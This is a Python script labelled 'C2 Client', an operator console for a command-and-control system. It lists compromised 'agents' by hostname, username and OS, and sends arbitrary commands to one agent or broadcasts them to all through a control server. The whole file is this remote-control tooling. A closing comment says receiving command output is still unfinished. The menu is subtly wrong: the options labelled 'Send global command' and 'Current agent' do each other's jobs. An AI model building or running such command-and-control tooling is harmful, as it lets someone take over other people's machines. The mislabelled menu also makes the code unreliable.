import requests
import json
import sys
import time

SERVER_URL = "http://localhost:5050"

def print_agents():
    response = requests.get(f"{SERVER_URL}/agents")
    agents = response.json().get('agents', [])
    
    if not agents:
        print("No agents connected")
        return
    
    print("\nConnected Agents:")
    print("=================")
    for agent in agents:
        print(f"ID: {agent['id']}")
        print(f"  Hostname: {agent['hostname']}")
        print(f"  Username: {agent['username']}")
        print(f"  OS: {agent['os']}")
        print(f"  Last Seen: {agent['last_seen']}")
        print()

def send_command(agent_id, command):
    data = {
        'id': agent_id,
        'command': command
    }
    response = requests.post(f"{SERVER_URL}/command", json=data)
    if response.json().get('status') == 'success':
        print(f"Command sent to agent {agent_id}")
    else:
        print(f"Error sending command: {response.json().get('message')}")

def main_loop():
    print("C2 Client")
    print("=========")
    
    current_agent = None
    
    while True:
        print("\nOptions:")
        print("1. List agents")
        print("2. Select agent")
        print("3. Send command")
        print("4. Send global command")
        print("5. Current agent")
        print("6. Exit")

        response = requests.get(f"{SERVER_URL}/agents")
        agents = response.json().get('agents', [])
        
        choice = input("\nEnter choice: ")
        
        if choice == '1':
            print_agents()
        elif choice == '2':
            print_agents()
            current_agent = input("Enter agent ID to select: ")
            print(f"Selected agent: {current_agent}")
        elif choice == '3':
            if not current_agent:
                print("No agent selected. Please select an agent first.")
                print_agents()
                current_agent = input("Enter agent ID: ")
            
            command = input(f"Enter command for agent {current_agent}: ")
            send_command(current_agent, command)
        elif choice == '4':
            if current_agent:
                print(f"Current selected agent: {current_agent}")
            else:
                print("No agent currently selected.")
        elif choice == '5':
            command = input(f"Enter command for all agents: ")
            for agent in agents:
                send_command(agent['id'], command)
                time.sleep(2)
        elif choice == '6':
            print("Exiting...")
            sys.exit(0)
        else:
            print("Invalid choice")
        
        time.sleep(1)

if __name__ == "__main__":
    main_loop()


# Cli needs to recive output from the server